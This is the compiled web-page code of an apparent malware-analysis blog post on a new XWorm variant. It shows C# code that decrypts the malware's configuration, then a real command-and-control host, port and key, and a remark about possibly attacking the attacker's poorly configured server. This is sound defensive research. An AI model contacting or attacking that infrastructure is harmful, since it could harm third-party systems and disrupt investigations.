#89DDFF">.</span><span style="color: #82AAFF">WriteLine</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">Decrypted Port: </span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> Settings</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">Port</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">        Settings</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">KEY </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> AlgorithmAES</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">Decrypt</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">Settings</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">KEY</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">        Console</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">WriteLine</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">Decrypted KEY: </span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> Settings</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">KEY</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">        Settings</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">SPL </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> AlgorithmAES</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">Decrypt</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">Settings</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">SPL</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">        Console</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">WriteLine</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">Decrypted SPL: </span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> Settings</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">SPL</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">        Settings</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">USBNM </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> AlgorithmAES</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">Decrypt</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">Settings</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">USBNM</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">        Console</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">WriteLine</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">Decrypted USBNM: </span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> Settings</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">USBNM</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #89DDFF">&#125;</span></div></code></div></pre>`,vs,ss,Ie="Finally, we can reveal the malware family used by threat actors:",Zs,ms,tl=`<pre class="shiki material-default with-title" style="background-color: #263238; color: #EEFFFF" bash="true" title="decrypted strings"><div class='code-title'>decrypted strings</div><div class="language-id">bash</div><div class='code-container'><code><div class='line dim'><span style="color: #EEFFFF">Decrypted Host: xwv5group7001.duckdns.org</span></div><div class='line dim'><span style="color: #EEFFFF">Decrypted Port: 7001</span></div><div class='line dim'><span style="color: #EEFFFF">Decrypted KEY: </span><span style="color: #89DDFF">&lt;</span><span style="color: #EEFFFF">1</span><span style="color: #89DDFF">23456789&gt;</span></div><div class='line highlight'><span style="color: #EEFFFF">Decrypted SPL: </span><span style="color: #89DDFF">&lt;</span><span style="color: #EEFFFF">Xwormmm</span><span style="color: #89DDFF">&gt;</span></div><div class='line dim'><span style="color: #EEFFFF">Decrypted USBNM: USB.exe</span></div></code></div></pre>`,fs,es,je='Taking a closer look at its functions in ILSpy, we find that it’s indeed <code>XWorm</code>. On internet, there is already a lot of research done on this malware. Even though, I will mention some of its capabilities: recording keystrokes, printscreens at specific interval of time and sending them to the attacker at random time (this jitter can be useful for bypassing network monitoring solutions). <code>Trellix</code> covered more rigorously this topic <a href="https://www.trellix.com/blogs/research/old-loader-new-threat-exploring-xworm/" rel="nofollow noopener noreferrer external" target="_blank">here</a>.',Js,S,Ne='<a href="#conclusion">Conclusion</a>',se,ls,qe="The hunt is not over yet since we have valuable informations to work with. For instance, <code>xwv5group7001.duckdns.org</code> is a domain name registered by the attacker. It might provide additional information about his real identity, through OSINT techniques. Maybe the C2 infrastructured is poorly configured, leaving it vulnerable to attacks from defenders who are investigating this case. What about other clues left behind during this analysis process?",ee,as,Ge="Our jorney will end here for now, but it is worth investigating what hasn’t been covered in this post. Sometimes you end up finding interesting information:). Thank you for your undivided attention during this reading and don’t hesitate to contact me on social media for questions or feedback. Best wishes until next time!",le,L,ae;return L=new yl({props:{subname:"KE",bio:"",$$slots:{default:[dl]},$$scope:{ctx:m}}}),{c(){p=o("h2"),p.innerHTML=E,y=n(),d=o("p"),d.textContent=i,D=n(),u=o("p"),u.innerHTML=te,hs=n(),f=o("h2"),f.innerHTML=oe,gs=n(),$=o("p"),$.innerHTML=Fe,Cs=n(),ns=new H(!1),ts=n(),I=o("p"),I.innerHTML=pe,bs=n(),h=o("img"),ws=n(),j=o("p"),j.innerHTML=ce,xs=n(),g=o("img"),_s=n(),N=o("p"),N.innerHTML=ye,As=n(),os=new H(!1),Fs=n(),q=o("p"),q.innerHTML=de,Ts=n(),C=o("h2"),C.innerHTML=Ee,ks=n(),G=o("p"),G.innerHTML=De,Bs=n(),ps=new H(!1),rs=n(),U=o("p"),U.textContent=ue,Ms=n(),b=o("img"),Ss=n(),W=o("p"),W.innerHTML=me,Ls=n(),cs=new H(!1),is=n(),z=o("p"),z.innerHTML=fe,Hs=n(),w=o("h2"),w.innerHTML=he,Ps=n(),K=o("p"),K.innerHTML=ge,$s=n(),x=o("img"),Is=n(),V=o("p"),V.innerHTML=be,js=n(),O=o("p"),O.innerHTML=we,Ns=n(),_=o("img"),qs=n(),R=o("p"),R.innerHTML=_e,Gs=n(),A=o("img"),Us=n(),X=o("p"),X.innerHTML=Te,Ws=n(),ys=new H(!1),ds=n(),Q=o("p"),Q.innerHTML=ke,zs=n(),T=o("img"),Ks=n(),k=o("h2"),k.innerHTML=Me,Vs=n(),Y=o("p"),Y.textContent=Se,Os=n(),Es=new H(!1),Ds=n(),Z=o("p"),Z.innerHTML=Le,Rs=n(),B=o("img"),Xs=n(),M=o("img"),Qs=n(),J=o("p"),J.textContent=$e,Ys=n(),us=new H(!1),vs=n(),ss=o("p"),ss.textContent=Ie,Zs=n(),ms=new H(!1),fs=n(),es=o("p"),es.innerHTML=je,Js=n(),S=o("h2"),S.innerHTML=Ne,se=n(),ls=o("p"),ls.innerHTML=qe,ee=n(),as=o("p"),as.textContent=Ge,le=n(),Ve(L.$$.fragment),this.h()},l(s){p=F(s,"H2",{id:!0,"data-svelte-h":!0}),c(p)!=="svelte-ccveyw"&&(p.innerHTML=E),y=t(s),d=F(s,"P",{"data-svelte-h":!0}),c(d)!=="svelte-l0ad4k"&&(d.textContent=i),D=t(s),u=F(s,"P",{"data-svelte-h":!0}),c(u)!=="svelte-1onww4q"&&(u.innerHTML=te),hs=t(s),f=F(s,"H2",{id:!0,"data-svelte-h":!0}),c(f)!=="svelte-143uk5j"&&(f.innerHTML=oe),gs=t(s),$=F(s,"P",{"data-svelte-h":!0}),c($)!=="svelte-1qw7k5v"&&($.innerHTML=Fe),Cs=t(s),ns=P(s,!1),ts=t(s),I=F(s,"P",{"data-svelte-h":!0}),c(I)!=="svelte-1h3vs2a"&&(I.innerHTML=pe),bs=t(s),h=F(s,"IMG",{src:!0,alt:!0,class:!0}),ws=t(s),j=F(s,"P",{"data-svelte-h":!0}),c(j)!=="svelte-gqvjlb"&&(j.innerHTML=ce),xs=t(s),g=F(s,"IMG",{src:!0,alt:!0,class:!0}),_s=t(s),N=F(s,"P",{"data-svelte-h":!0}),c(N)!=="svelte-71phqk"&&(N.innerHTML=ye),As=t(s),os=P(s,!1),Fs=t(s),q=F(s,"P",{"data-svelte-h":!0}),c(q)!=="svelte-rqfhvz"&&(q.innerHTML=de),Ts=t(s),C=F(s,"H2",{id:!0,"data-svelte-h":!0}),c(C)!=="svelte-1wjvziz"&&(C.innerHTML=Ee),ks=t(s),G=F(s,"P",{"data-svelte-h":!0}),c(G)!=="svelte-1r2u4qj"&&(G.innerHTML=De),Bs=t(s),ps=P(s,!1),rs=t(s),U=F(s,"P",{"data-svelte-h":!0}),c(U)!=="svelte-5hhyp2"&&(U.textContent=ue),Ms=t(s),b=F(s,"IMG",{src:!0,alt:!0,class:!0}),Ss=t(s),W=F(s,"P",{"data-svelte-h":!0}),c(W)!=="svelte-ge3kz"&&(W.innerHTML=me),Ls=t(s),cs=P(s,!1),is=t(s),z=F(s,"P",{"data-svelte-h":!0}),c(z)!=="svelte-pbeqsv"&&(z.innerHTML=fe),Hs=t(s),w=F(s,"H2",{id:!0,"data-svelte-h":!0}),c(w)!=="svelte-1akbftj"&&(w.innerHTML=he),Ps=t(s),K=F(s,"P",{"data-svelte-h":!0}),c(K)!=="svelte-12llahp"&&(K.innerHTML=ge),$s=t(s),x=F(s,"IMG",{src:!0,alt:!0,class:!0}),Is=t(s),V=F(s,"P",{"data-svelte-h":!0}),c(V)!=="svelte-y4xqpq"&&(V.innerHTML=be),js=t(s),O=F(s,"P",{"data-svelte-h":!0}),c(O)!=="svelte-1fc9qni"&&(O.innerHTML=we),Ns=t(s),_=F(s,"IMG",{src:!0,alt:!0,class:!0}),qs=t(s),R=F(s,"P",{"data-svelte-h":!0}),c(R)!=="svelte-23ztk8"&&(R.innerHTML=_e),Gs=t(s),A=F(s,"IMG",{src:!0,alt:!0,class:!0}),Us=t(s),X=F(s,"P",{"data-svelte-h":!0}),c(X)!=="svelte-yzv1ld"&&(X.innerHTML=Te),Ws=t(s),ys=P(s,!1),ds=t(s),Q=F(s,"P",{"data-svelte-h":!0}),c(Q)!=="svelte-v92x8g"&&(Q.innerHTML=ke),zs=t(s),T=F(s,"IMG",{src:!0,alt:!0,class:!0}),Ks=t(s),k=F(s,"H2",{id:!0,"data-svelte-h":!0}),c(k)!=="svelte-bjozqq"&&(k.innerHTML=Me),Vs=t(s),Y=F(s,"P",{"data-svelte-h":!0}),c(Y)!=="svelte-e5k1l8"&&(Y.textContent=Se),Os=t(s),Es=P(s,!1),Ds=t(s),Z=F(s,"P",{"data-svelte-h":!0}),c(Z)!=="svelte-1dnjm7i"&&(Z.innerHTML=Le),Rs=t(s),B=F(s,"IMG",{src:!0,alt:!0,class:!0}),Xs=t(s),M=F(s,"IMG",{src:!0,alt:!0,class:!0}),Qs=t(s),J=F(s,"P",{"data-svelte-h":!0}),c(J)!=="svelte-y5a8fg"&&(J.textContent=$e),Ys=t(s),us=P(s,!1),vs=t(s),ss=F(s,"P",{"data-svelte-h":!0}),c(ss)!=="svelte-sv5aos"&&(ss.textContent=Ie),Zs=t(s),ms=P(s,!1),fs=t(s),es=F(s,"P",{"data-svelte-h":!0}),c(es)!=="svelte-3hipc8"&&(es.innerHTML=je),Js=t(s),S=F(s,"H2",{id:!0,"data-svelte-h":!0}),c(S)!=="svelte-kmpttn"&&(S.innerHTML=Ne),se=t(s),ls=F(s,"P",{"data-svelte-h":!0}),c(ls)!=="svelte-20trsz"&&(ls.innerHTML=qe),ee=t(s),as=F(s,"P",{"data-svelte-h":!0}),c(as)!=="svelte-tpm7dn"&&(as.textContent=Ge),le=t(s),Oe(L.$$.fragment,s),this.h()},h(){r(p,"id","introduction"),r(f,"id","first-sign-of-malicious-code"),ns.a=ts,v(h.src,re="damaged-itemvbs.png")||r(h,"src",re),r(h,"alt","image"),r(h,"class","svelte-e0dhad"),v(g.src,ie="fetched-vbs.png")||r(g,"src",ie),r(g,"alt","image"),r(g,"class","svelte-e0dhad"),os.a=Fs,r(C,"id","new-language-old-friend"),ps.a=rs,v(b.src,ve="deobfs2.png")||r(b,"src",ve),r(b,"alt","image"),r(b,"class","svelte-e0dhad"),cs.a=is,r(w,"id","decompiling-the-culprit"),v(x.src,Ce="malware.png")||r(x,"src",Ce),r(x,"alt","image"),r(x,"class","svelte-e0dhad"),v(_.src,xe="decompiled1.png")||r(_,"src",xe),r(_,"alt","image"),r(_,"class","svelte-e0dhad"),v(A.src,Ae="malhelper.png")||r(A,"src",Ae),r(A,"alt","image"),r(A,"class","svelte-e0dhad"),ys.a=ds,v(T.src,Be="toolsmal.png")||r(T,"src",Be),r(T,"alt","image"),r(T,"class","svelte-e0dhad"),r(k,"id","searching-for-keys"),Es.a=Ds,v(B.src,He="worm1.png")||r(B,"src",He),r(B,"alt","image"),r(B,"class","svelte-e0dhad"),v(M.src,Pe="worm2.png")||r(M,"src",Pe),r(M,"alt","image"),r(M,"class","svelte-e0dhad"),us.a=vs,ms.a=fs,r(S,"id","conclusion")},m(s,e){l(s,p,e),l(s,y,e),l(s,d,e),l(s,D,e),l(s,u,e),l(s,hs,e),l(s,f,e),l(s,gs,e),l(s,$,e),l(s,Cs,e),ns.m(Ze,s,e),l(s,ts,e),l(s,I,e),l(s,bs,e),l(s,h,e),l(s,ws,e),l(s,j,e),l(s,xs,e),l(s,g,e),l(s,_s,e),l(s,N,e),l(s,As,e),os.m(Je,s,e),l(s,Fs,e),l(s,q,e),l(s,Ts,e),l(s,C,e),l(s,ks,e),l(s,G,e),l(s,Bs,e),ps.m(sl,s,e),l(s,rs,e),l(s,U,e),l(s,Ms,e),l(s,b,e),l(s,Ss,e),l(s,W,e),l(s,Ls,e),cs.m(el,s,e),l(s,is,e),l(s,z,e),l(s,Hs,e),l(s,w,e),l(s,Ps,e),l(s,K,e),l(s,$s,e),l(s,x,e),l(s,Is,e),l(s,V,e),l(s,js,e),l(s,O,e),l(s,Ns,e),l(s,_,e),l(s,qs,e),l(s,R,e),l(s,Gs,e),l(s,A,e),l(s,Us,e),l(s,X,e),l(s,Ws,e),ys.m(ll,s,e),l(s,ds,e),l(s,Q,e),l(s,zs,e),l(s,T,e),l(s,Ks,e),l(s,k,e),l(s,Vs,e),l(s,Y,e),l(s,Os,e),Es.m(al,s,e),l(s,Ds,e),l(s,Z,e),l(s,Rs,e),l(s,B,e),l(s,Xs,e),l(s,M,e),l(s,Qs,e),l(s,J,e),l(s,Ys,e),us.m(nl,s,e),l(s,vs,e),l(s,ss,e),l(s,Zs,e),ms.m(tl,s,e),l(s,fs,e),l(s,es,e),l(s,Js,e),l(s,S,e),l(s,se,e),l(s,ls,e),l(s,ee,e),l(s,as,e),l(s,le,e),Re(L,s,e),ae=!0},p(s,e){const Ue={};e&2&&(Ue.$$scope={dirty:e,ctx:s}),L.$set(Ue)},i(s){ae||(Xe(L.$$.fragment,s),ae=!0)},o(s){Qe(L.$$.fragment,s),ae=!1},d(s){s&&(a(p),a(y),a(d),a(D),a(u),a(hs),a(f),a(gs),a($),a(Cs),ns.d(),a(ts),a(I),a(bs),a(h),a(ws),a(j),a(xs),a(g),a(_s),a(N),a(As),os.d(),a(Fs),a(q),a(Ts),a(C),a(ks),a(G),a(Bs),ps.d(),a(rs),a(U),a(Ms),a(b),a(Ss),a(W),a(Ls),cs.d(),a(is),a(z),a(Hs),a(w),a(Ps),a(K),a($s),a(x),a(Is),a(V),a(js),a(O),a(Ns),a(_),a(qs),a(R),a(Gs),a(A),a(Us),a(X),a(Ws),ys.d(),a(ds),a(Q),a(zs),a(T),a(Ks),a(k),a(Vs),a(Y),a(Os),Es.d(),a(Ds),a(Z),a(Rs),a(B),a(Xs),a(M),a(Qs),a(J),a(Ys),us.d(),a(vs),a(ss),a(Zs),ms.d(),a(fs),a(es),a(Js),a(S),a(se),a(ls),a(ee),a(as),a(le)),Ye(L,s)}}}function Dl(m){let p,E;const y=[m[0],Ke];let d={$$slots:{default:[El]},$$scope:{ctx:m}};for(let i=0;i<y.length;i+=1)d=ne(d,y[i]);return p=new cl({props:d}),{c(){Ve(p.$$.fragment)},l(i){Oe(p.$$.fragment,i)},m(i,D){Re(p,i,D),E=!0},p(i,[D]){const u=D&1?il(y,[D&1&&ze(i[0]),D&0&&ze(Ke)]):{};D&2&&(u.$$scope={dirty:D,ctx:i}),p.$set(u)},i(i){E||(Xe(p.$$.fragment,i),E=!0)},o(i){Qe(p.$$.fragment,i),E=!1},d(i){Ye(p,i)}}}const Ke={title:"Hunting in the wild - XWorm new variant",alt:"Kryptoenix",created:"2024-02-17T00:00:00.000Z",updated:"2024-02-17T00:00:00.000Z",summary:"A fresh iteration of XWorm emerges, masquerading as an automation project within nefarious email attachments.",tags:["malware analysis","xworm"],image:"/assets/image1.jpeg",images:[],slug:"/first-post/+page.svelte.md",path:"/first-post",toc:[{depth:2,title:"Introduction",slug:"introduction"},{depth:2,title:"First sign of malicious code",slug:"first-sign-of-malicious-code"},{depth:2,title:"New language, old friend",slug:"new-language-old-friend"},{depth:2,title:"Decompiling the culprit",slug:"decompiling-the-culprit"},{depth:2,title:"Searching for keys?",slug:"searching-for-keys"},{depth:2,title:"Conclusion",slug:"conclusion"}]};function ul(m,p,E){return m.$$set=y=>{E(0,p=ne(ne({},p),We(y)))},p=We(p),[p]}class gl extends pl{constructor(p){super(),rl(this,p,ul,Dl,ol,{})}}export{gl as component};
